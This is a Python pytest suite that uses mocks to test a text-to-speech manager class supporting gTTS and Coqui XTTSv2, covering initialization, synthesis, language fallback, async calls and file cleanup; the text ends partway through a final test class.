import pytest
import asyncio
import tempfile
import os
from unittest.mock import Mock, patch, AsyncMock, MagicMock, call
import torch
from pathlib import Path

# Import the module under test
import sys
sys.path.insert(0, 'CharacterClient/src')
from tts_manager import TTSManager


class TestTTSManagerInitialization:
    """Test suite for TTSManager initialization scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_initialization_no_libraries_available(self, mock_ensure_dirs):
        """Test initialization when no TTS libraries are available"""
        manager = TTSManager(tts_service_name="gtts")
        assert manager.service_name == "gtts"
        assert manager.is_initialized is False
        assert manager.tts_instance is None
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_gtts_success(self, mock_gtts, mock_ensure_dirs):
        """Test successful gTTS initialization"""
        manager = TTSManager(tts_service_name="gtts", language="en")
        assert manager.service_name == "gtts"
        assert manager.language == "en"
        assert manager.is_initialized is True
        assert callable(manager.tts_instance)
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts', None)
    def test_initialization_gtts_not_available(self, mock_ensure_dirs):
        """Test gTTS initialization when library not available"""
        manager = TTSManager(tts_service_name="gtts")
        assert manager.is_initialized is False
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('torch.cuda.is_available', return_value=True)
    def test_initialization_xttsv2_success_cuda(self, mock_cuda, mock_coqui, mock_ensure_dirs):
        """Test successful XTTSv2 initialization with CUDA"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2", 
            model_name="tts_models/multilingual/multi-dataset/xtts_v2"
        )
        
        assert manager.service_name == "xttsv2"
        assert manager.model_name == "tts_models/multilingual/multi-dataset/xtts_v2"
        assert manager.is_initialized is True
        mock_tts_instance.to.assert_called_with("cuda")
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('torch.cuda.is_available', return_value=False)
    def test_initialization_xttsv2_success_cpu(self, mock_cuda, mock_coqui, mock_ensure_dirs):
        """Test successful XTTSv2 initialization with CPU"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="tts_models/multilingual/multi-dataset/xtts_v2"
        )
        
        mock_tts_instance.to.assert_called_with("cpu")
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_initialization_xttsv2_exception(self, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 initialization with exception"""
        mock_coqui.side_effect = Exception("Model loading failed")
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="tts_models/multilingual/multi-dataset/xtts_v2"
        )
        
        assert manager.is_initialized is False
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_no_model_name_for_xttsv2(self, mock_ensure_dirs):
        """Test XTTSv2 initialization without model name"""
        manager = TTSManager(tts_service_name="xttsv2")
        assert manager.is_initialized is False
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_unsupported_service(self, mock_ensure_dirs):
        """Test initialization with unsupported service"""
        manager = TTSManager(tts_service_name="unsupported_service")
        assert manager.is_initialized is False
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_default_values(self, mock_ensure_dirs):
        """Test initialization with default parameter values"""
        manager = TTSManager(tts_service_name="gtts")
        assert manager.model_name == ""
        assert manager.speaker_wav_path == ""
        assert manager.language == "en"
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_none_language(self, mock_ensure_dirs):
        """Test initialization with None language gets converted to default"""
        manager = TTSManager(tts_service_name="gtts", language=None)
        assert manager.language == "en"
        
    @patch('tts_manager.ensure_client_directories')
    @patch('os.makedirs')
    def test_initialization_creates_directories(self, mock_makedirs, mock_ensure_dirs):
        """Test that initialization creates necessary directories"""
        TTSManager(tts_service_name="gtts")
        mock_ensure_dirs.assert_called_once()


class TestTTSManagerGTTSSynthesis:
    """Test suite for gTTS synthesis functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_gtts_synthesize_blocking_success(self, mock_gtts_module, mock_ensure_dirs):
        """Test successful gTTS blocking synthesis"""
        mock_gtts_instance = Mock()
        mock_gtts_module.gTTS.return_value = mock_gtts_instance
        
        manager = TTSManager(tts_service_name="gtts", language="fr")
        manager._gtts_synthesize_blocking("Bonjour", "/path/to/output.mp3", "fr")
        
        mock_gtts_module.gTTS.assert_called_with(text="Bonjour", lang="fr")
        mock_gtts_instance.save.assert_called_with("/path/to/output.mp3")
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts', None)
    def test_gtts_synthesize_blocking_not_available(self, mock_ensure_dirs, capsys):
        """Test gTTS synthesis when library not available"""
        manager = TTSManager(tts_service_name="gtts")
        manager._gtts_synthesize_blocking("Hello", "/path/to/output.mp3", "en")
        
        captured = capsys.readouterr()
        assert "gTTS is not available" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_gtts_synthesize_blocking_no_gtts_class(self, mock_gtts_module, mock_ensure_dirs, capsys):
        """Test gTTS synthesis when gTTS class is not available"""
        # Mock gtts module without gTTS class
        delattr(mock_gtts_module, 'gTTS')
        
        manager = TTSManager(tts_service_name="gtts")
        manager._gtts_synthesize_blocking("Hello", "/path/to/output.mp3", "en")
        
        captured = capsys.readouterr()
        assert "gTTS is not available" in captured.out


class TestTTSManagerXTTSv2Synthesis:
    """Test suite for XTTSv2 synthesis functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('os.path.exists', return_value=True)
    def test_xttsv2_synthesize_blocking_with_speaker(self, mock_exists, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 synthesis with speaker wav file"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en", "es", "fr"]
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model",
            speaker_wav_path="/path/to/speaker.wav"
        )
        
        manager._xttsv2_synthesize_blocking(
            "Hello world", 
            "/path/to/output.wav", 
            "/path/to/speaker.wav", 
            "en"
        )
        
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello world",
            speaker_wav="/path/to/speaker.wav",
            language="en",
            file_path="/path/to/output.wav"
        )
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('os.path.exists', return_value=False)
    def test_xttsv2_synthesize_blocking_no_speaker(self, mock_exists, mock_coqui, mock_ensure_dirs, capsys):
        """Test XTTSv2 synthesis without speaker wav file"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en", "es", "fr"]
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        manager._xttsv2_synthesize_blocking(
            "Hello world",
            "/path/to/output.wav",
            "/nonexistent/speaker.wav",
            "en"
        )
        
        captured = capsys.readouterr()
        assert "speaker_wav" in captured.out and "not found" in captured.out
        
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello world",
            language="en",
            file_path="/path/to/output.wav"
        )
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_synthesize_blocking_unsupported_language(self, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 synthesis with unsupported language"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en", "es", "fr"]
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        manager._xttsv2_synthesize_blocking(
            "Hello world",
            "/path/to/output.wav",
            None,
            "zh"  # Unsupported language
        )
        
        # Should fall back to first available language
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello world",
            language="en",  # First in languages list
            file_path="/path/to/output.wav"
        )
        
    @patch('tts_manager.ensure_client_directories')
    def test_xttsv2_synthesize_blocking_no_instance(self, mock_ensure_dirs, capsys):
        """Test XTTSv2 synthesis when instance is not available"""
        manager = TTSManager(tts_service_name="xttsv2")
        manager.tts_instance = None
        
        manager._xttsv2_synthesize_blocking("Hello", "/path/to/output.wav")
        
        captured = capsys.readouterr()
        assert "not available or invalid" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    def test_xttsv2_synthesize_blocking_invalid_instance(self, mock_ensure_dirs, capsys):
        """Test XTTSv2 synthesis with invalid instance"""
        manager = TTSManager(tts_service_name="xttsv2")
        manager.tts_instance = "invalid_instance"  # Not a proper TTS instance
        
        manager._xttsv2_synthesize_blocking("Hello", "/path/to/output.wav")
        
        captured = capsys.readouterr()
        assert "not available or invalid" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_synthesize_blocking_none_language(self, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 synthesis with None language"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en", "es"]
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        manager._xttsv2_synthesize_blocking(
            "Hello world",
            "/path/to/output.wav",
            None,
            None  # None language
        )
        
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello world",
            language="en",  # Should default to "en"
            file_path="/path/to/output.wav"
        )


class TestTTSManagerAsyncSynthesis:
    """Test suite for async synthesis functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CLIENT_TEMP_AUDIO_PATH', '/tmp/test_audio')
    @patch('os.makedirs')
    @patch('asyncio.to_thread')
    async def test_synthesize_gtts_success(self, mock_to_thread, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test successful async gTTS synthesis"""
        mock_to_thread.return_value = None  # Successful synthesis
        
        manager = TTSManager(tts_service_name="gtts", language="en")
        result = await manager.synthesize("Hello world", "test_output.mp3")
        
        assert result == "/tmp/test_audio/test_output.mp3"
        mock_makedirs.assert_called_with('/tmp/test_audio', exist_ok=True)
        mock_to_thread.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('tts_manager.CLIENT_TEMP_AUDIO_PATH', '/tmp/test_audio')
    @patch('os.makedirs')
    @patch('asyncio.to_thread')
    async def test_synthesize_xttsv2_success(self, mock_to_thread, mock_makedirs, mock_coqui, mock_ensure_dirs):
        """Test successful async XTTSv2 synthesis"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_to_thread.return_value = None
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
        
        assert result == "/tmp/test_audio/test_output.wav"
        mock_to_thread.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_not_initialized(self, mock_ensure_dirs, capsys):
        """Test async synthesis when not initialized"""
        manager = TTSManager(tts_service_name="unsupported")
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Not initialized" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    async def test_synthesize_exception_handling(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
        """Test async synthesis exception handling"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello world", "test_output.mp3")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Error during async TTS synthesis" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    @patch('os.path.exists', return_value=True)
    @patch('os.remove')
    async def test_synthesize_cleanup_on_error(self, mock_remove, mock_exists, mock_to_thread, mock_gtts, mock_ensure_dirs):
        """Test file cleanup on synthesis error"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        await manager.synthesize("Hello world", "test_output.mp3")
        
        mock_remove.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_unsupported_service(self, mock_ensure_dirs, capsys):
        """Test async synthesis with unsupported service"""
        manager = TTSManager(tts_service_name="unsupported")
        manager.is_initialized = True  # Force initialized state
        manager.tts_instance = Mock()
        
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "No async synthesis method" in captured.out


class TestTTSManagerStaticMethods:
    """Test suite for static methods"""
    
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_list_services_both_available(self, mock_coqui, mock_gtts):
        """Test listing services when both are available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" in services
        assert len(services) == 2
        
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_only_gtts(self, mock_gtts):
        """Test listing services when only gTTS is available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" not in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS')
    def test_list_services_only_xttsv2(self, mock_coqui):
        """Test listing services when only XTTSv2 is available"""
        services = TTSManager.list_services()
        assert "gtts" not in services
        assert "xttsv2" in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_none_available(self):
        """Test listing services when none are available"""
        services = TTSManager.list_services()
        assert len(services) == 0
        
    def test_get_available_models_gtts(self):
        """Test getting available models for gTTS"""
        models = TTSManager.get_available_models("gtts")
        assert models == ["N/A (uses language codes)"]
        
    def test_get_available_models_xttsv2(self):
        """Test getting available models for XTTSv2"""
        models = TTSManager.get_available_models("xttsv2")
        assert "tts_models/multilingual/multi-dataset/xtts_v2" in models
        
    def test_get_available_models_unsupported(self):
        """Test getting available models for unsupported service"""
        models = TTSManager.get_available_models("unsupported")
        assert models == []


class TestTTSManagerModelHandling:
    """Test suite for model handling functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CLIENT_TTS_MODELS_PATH', '/tmp/test_models')
    @patch('os.makedirs')
    def test_get_or_download_model_blocking_xttsv2(self, mock_makedirs, mock_ensure_dirs):
        """Test model handling for XTTSv2"""
        manager = TTSManager(tts_service_name="gtts")  # Any service for testing
        result = manager._get_or_download_model_blocking("xttsv2", "test_model")
        
        assert result == "test_model"
        mock_makedirs.assert_called()
        
    @patch('tts_manager.ensure_client_directories')
    def test_get_or_download_model_blocking_unsupported(self, mock_ensure_dirs):
        """Test model handling for unsupported service"""
        manager = TTSManager(tts_service_name="gtts")
        result = manager._get_or_download_model_blocking("unsupported", "test_model")
        
        assert result is None


class TestTTSManagerEdgeCases:
    """Test suite for edge cases and error conditions"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_empty_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with empty text"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            result = await manager.synthesize("", "output.mp3")
            # Should still attempt synthesis - TTS service handles empty text
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_very_long_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with very long text"""
        long_text = "A" * 10000
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(long_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_special_characters(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with special characters"""
        special_text = "Hello! 👋 How are you? 🤔 Fine, thanks! 😊"
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(special_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_none_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with None filename"""
        manager = TTSManager(tts_service_name="gtts")
        
        # This should raise an exception due to os.path.join with None
        with pytest.raises((TypeError, AttributeError)):
            await manager.synthesize("Hello", None)
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_invalid_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with invalid filename characters"""
        manager = TTSManager(tts_service_name="gtts")
        invalid_filename = "output<>:\"|?*.mp3"
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", invalid_filename)
            # Should still attempt - OS handles invalid filenames
            mock_to_thread.assert_called_once()


class TestTTSManagerLanguageHandling:
    """Test suite for language-specific functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_various_languages(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with various language codes"""
        languages = ["en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh"]
        
        for lang in languages:
            manager = TTSManager(tts_service_name="gtts", language=lang)
            assert manager.language == lang
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_invalid_language_code(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with invalid language code"""
        manager = TTSManager(tts_service_name="gtts", language="invalid_lang")
        assert manager.language == "invalid_lang"  # Should accept any string
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_empty_language(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with empty language string"""
        manager = TTSManager(tts_service_name="gtts", language="")
        assert manager.language == "en"  # Should default to "en"


class TestTTSManagerConcurrency:
    """Test suite for concurrent operations"""
    
    @patch('tts_manager.ensure_client_directories')  
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_requests(self, mock_gtts, mock_ensure_dirs):
        """Test handling multiple concurrent synthesis requests"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Create multiple concurrent synthesis tasks
            tasks = []
            for i in range(5):
                task = manager.synthesize(f"Text {i}", f"output_{i}.mp3")
                tasks.append(task)
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should complete successfully
            assert len(results) == 5
            assert all(r is not None for r in results if not isinstance(r, Exception))
            assert mock_to_thread.call_count == 5


class TestTTSManagerFileSystemOperations:
    """Test suite for file system related operations"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.makedirs', side_effect=PermissionError("Permission denied"))
    async def test_synthesize_makedirs_permission_error(self, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test synthesis when directory creation fails due to permissions"""
        manager = TTSManager(tts_service_name="gtts")
        
        with pytest.raises(PermissionError):
            await manager.synthesize("Hello", "output.mp3")
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.remove', side_effect=OSError("Removal failed"))
    @patch('os.path.exists', return_value=True)
    @patch('asyncio.to_thread', side_effect=Exception("Synthesis failed"))
    async def test_synthesize_cleanup_failure(self, mock_to_thread, mock_exists, mock_remove, mock_gtts, mock_ensure_dirs):
        """Test synthesis cleanup when file removal fails"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Should not raise exception even if cleanup fails
        result = await manager.synthesize("Hello", "output.mp3")
        assert result is None
        mock_remove.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

class TestTTSManagerConfigurationValidation:
    """Test suite for configuration validation and parameter handling"""
    
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_parameter_boundaries(self, mock_ensure_dirs):
        """Test initialization with boundary parameter values"""
        # Test with maximum length strings
        long_service = "a" * 1000
        long_model = "b" * 1000
        long_speaker_path = "c" * 1000
        long_language = "d" * 1000
        
        manager = TTSManager(
            tts_service_name=long_service,
            model_name=long_model,
            speaker_wav_path=long_speaker_path,
            language=long_language
        )
        
        assert manager.service_name == long_service
        assert manager.model_name == long_model
        assert manager.speaker_wav_path == long_speaker_path
        assert manager.language == long_language
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_with_numeric_parameters(self, mock_ensure_dirs):
        """Test initialization with numeric parameter values"""
        # Test behavior when parameters are numbers (should be converted to strings)
        manager = TTSManager(
            tts_service_name=123,
            model_name=456.789,
            language=0
        )
        
        assert manager.service_name == 123
        assert manager.model_name == 456.789
        assert manager.language == 0
        
    @patch('tts_manager.ensure_client_directories')
    def test_initialization_with_boolean_parameters(self, mock_ensure_dirs):
        """Test initialization with boolean parameter values"""
        manager = TTSManager(
            tts_service_name=True,
            model_name=False,
            language=True
        )
        
        assert manager.service_name is True
        assert manager.model_name is False
        assert manager.language is True


class TestTTSManagerStateManagement:
    """Test suite for state management and transitions"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_reinitialization_same_service(self, mock_gtts, mock_ensure_dirs):
        """Test creating multiple instances with same service"""
        manager1 = TTSManager(tts_service_name="gtts", language="en")
        manager2 = TTSManager(tts_service_name="gtts", language="fr")
        
        assert manager1.language == "en"
        assert manager2.language == "fr"
        assert manager1.is_initialized == manager2.is_initialized
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_instance_isolation(self, mock_gtts, mock_ensure_dirs):
        """Test that different instances don't interfere with each other"""
        manager1 = TTSManager(tts_service_name="gtts", language="en")
        manager2 = TTSManager(tts_service_name="gtts", language="es")
        
        # Modify one instance
        manager1.language = "modified"
        
        # Other instance should be unaffected
        assert manager2.language == "es"
        
    @patch('tts_manager.ensure_client_directories')
    def test_state_after_failed_initialization(self, mock_ensure_dirs):
        """Test state consistency after failed initialization"""
        manager = TTSManager(tts_service_name="nonexistent_service")
        
        # Verify consistent failed state
        assert manager.is_initialized is False
        assert manager.tts_instance is None
        assert manager.service_name == "nonexistent_service"


class TestTTSManagerPathHandling:
    """Test suite for comprehensive path handling scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CLIENT_TEMP_AUDIO_PATH', '/custom/audio/path')
    @patch('os.makedirs')
    @patch('asyncio.to_thread')
    async def test_synthesize_custom_temp_path(self, mock_to_thread, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test synthesis with custom temporary audio path"""
        mock_to_thread.return_value = None
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello", "test.mp3")
        
        assert result == "/custom/audio/path/test.mp3"
        mock_makedirs.assert_called_with('/custom/audio/path', exist_ok=True)
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_relative_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with relative path in filename"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", "subdir/test.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_absolute_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with absolute path in filename (should be handled appropriately)"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", "/absolute/path/test.mp3")
            mock_to_thread.assert_called_once()


class TestTTSManagerErrorPropagation:
    """Test suite for error propagation and exception handling"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_gtts_synthesize_blocking_save_error(self, mock_gtts_module, mock_ensure_dirs, capsys):
        """Test gTTS synthesis when save operation fails"""
        mock_gtts_instance = Mock()
        mock_gtts_instance.save.side_effect = IOError("Disk full")
        mock_gtts_module.gTTS.return_value = mock_gtts_instance
        
        manager = TTSManager(tts_service_name="gtts")
        
        # Should not raise exception but handle gracefully
        with pytest.raises(IOError):
            manager._gtts_synthesize_blocking("Hello", "/path/to/output.mp3", "en")
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_synthesize_blocking_tts_to_file_error(self, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 synthesis when tts_to_file fails"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = ["en"]
        mock_tts_instance.tts_to_file.side_effect = RuntimeError("CUDA out of memory")
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        with pytest.raises(RuntimeError):
            manager._xttsv2_synthesize_blocking("Hello", "/path/to/output.wav", None, "en")


class TestTTSManagerResourceManagement:
    """Test suite for resource management and cleanup"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.makedirs')
    @patch('os.path.exists', return_value=True)
    @patch('os.remove')
    @patch('asyncio.to_thread')
    async def test_synthesize_successful_cleanup_sequence(self, mock_to_thread, mock_remove, mock_exists, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test the complete cleanup sequence on successful synthesis"""
        mock_to_thread.return_value = None
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello", "test.mp3")
        
        # Should create directory but not remove file on success
        mock_makedirs.assert_called_once()
        mock_remove.assert_not_called()
        assert result is not None
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_multiple_error_cleanup_calls(self, mock_gtts, mock_ensure_dirs):
        """Test cleanup behavior with multiple rapid failures"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread', side_effect=Exception("Synthesis failed")), \
             patch('os.path.exists', return_value=True), \
             patch('os.remove') as mock_remove:
            
            # Multiple rapid failures
            tasks = [manager.synthesize("Hello", f"test_{i}.mp3") for i in range(3)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Each should attempt cleanup
            assert len(results) == 3
            assert mock_remove.call_count == 3


class TestTTSManagerAdvancedLanguageScenarios:
    """Test suite for advanced language handling scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_language_fallback_empty_list(self, mock_coqui, mock_ensure_dirs):
        """Test XTTSv2 language handling when languages list is empty"""
        mock_tts_instance = Mock()
        mock_tts_instance.languages = []  # Empty languages list
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        manager._xttsv2_synthesize_blocking("Hello", "/path/to/output.wav", None, "en")
        
        # Should handle gracefully and use the requested language anyway
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello",
            language="en",
            file_path="/path/to/output.wav"
        )
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    def test_xttsv2_languages_attribute_missing(self, mock_coqui, mock_ensure_dirs, capsys):
        """Test XTTSv2 when languages attribute is missing"""
        mock_tts_instance = Mock()
        # Remove languages attribute to simulate older version or different implementation
        if hasattr(mock_tts_instance, 'languages'):
            delattr(mock_tts_instance, 'languages')
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        # Should handle gracefully
        manager._xttsv2_synthesize_blocking("Hello", "/path/to/output.wav", None, "en")
        
        mock_tts_instance.tts_to_file.assert_called_with(
            text="Hello",
            language="en",
            file_path="/path/to/output.wav"
        )


class TestTTSManagerPerformanceScenarios:
    """Test suite for performance-related scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_rapid_successive_calls(self, mock_gtts, mock_ensure_dirs):
        """Test rapid successive synthesis calls"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Rapid successive calls
            tasks = []
            for i in range(10):
                task = manager.synthesize(f"Text {i}", f"rapid_{i}.mp3")
                tasks.append(task)
                
            # Don't wait between calls - immediate successive calls
            results = await asyncio.gather(*tasks)
            
            assert len(results) == 10
            assert mock_to_thread.call_count == 10
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_synthesize_blocking_memory_stress(self, mock_gtts, mock_ensure_dirs):
        """Test memory usage with large text blocks"""
        # Create a very large text block
        massive_text = "This is a test sentence. " * 10000  # ~250KB of text
        
        manager = TTSManager(tts_service_name="gtts")
        
        # Should handle large text without memory issues
        # This is more of a smoke test - actual memory testing would require different tools
        manager._gtts_synthesize_blocking(massive_text, "/tmp/test.mp3", "en")


class TestTTSManagerMockValidation:
    """Test suite for validating mock interactions and call patterns"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_gtts_synthesize_parameter_validation(self, mock_gtts_module, mock_ensure_dirs):
        """Test that gTTS is called with exact expected parameters"""
        mock_gtts_instance = Mock()
        mock_gtts_module.gTTS.return_value = mock_gtts_instance
        
        manager = TTSManager(tts_service_name="gtts")
        
        # Test with specific parameters
        test_text = "Specific test text"
        test_path = "/specific/test/path.mp3"
        test_lang = "es"
        
        manager._gtts_synthesize_blocking(test_text, test_path, test_lang)
        
        # Validate exact call
        mock_gtts_module.gTTS.assert_called_once_with(text=test_text, lang=test_lang)
        mock_gtts_instance.save.assert_called_once_with(test_path)
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    @patch('os.path.exists', return_value=True)
